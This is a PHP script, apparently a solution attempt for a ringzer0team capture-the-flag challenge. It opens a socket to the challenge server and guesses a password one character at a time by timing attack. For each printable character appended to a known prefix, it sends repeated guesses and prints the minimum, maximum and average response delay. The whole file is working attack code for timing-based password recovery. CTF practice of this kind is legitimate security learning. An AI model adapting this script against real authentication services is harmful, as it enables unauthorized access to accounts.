<?php

function cleanUp($string) {

$patterns = [
  '/Password:Wrong pasword. Server take 0./',
  '/ seconds/',
];

return intval(preg_replace($patterns, '', $string));

}

function checkChar($fp){

  $table = []; 
  for($i=33; $i<=126; $i++){
   
    $max = 0;
    $min = 100000;
    $avg = [];
    $avgRes = 0;

   
    for($x=0; $x<=20; $x++) {
      $password = 'G0OdPwd' . chr($i) . PHP_EOL;
      fwrite($fp, $password);
      //sleep(1);
      $response =  fgets($fp, 128);
      $currentDelay = cleanUp($response);
     
      if ( $currentDelay > $max ) {
        $max = $currentDelay;
      }elseif( $currentDelay < $min ) {
        $min = $currentDelay;
      }
     
      $avg[] = $currentDelay;
     
    }
    //echo chr($i) . ' max delay = ' . $max . PHP_EOL;
    $avgRes = array_sum($avg) / count($avg);
   
    $output = " min = %d, max = %d, avg = %d";
    echo PHP_EOL . chr($i);
    printf($output, $min, $max, $avgRes);
   
    //$table[chr($i)]['min'] = $max;   
       
  }
 
  //print_r($table);

}


$fp = fsockopen("ringzer0team.com", 60000, $errno, $errstr, 30);

if (!$fp) {
    echo "$errstr ($errno)<br />\n";
} else {
    fwrite($fp, "AAAAAAAA" . PHP_EOL);
    $response =  fgets($fp, 128);

   
    while (!feof($fp)) {
   
      checkChar($fp);   
     
    }
    fclose($fp);
}
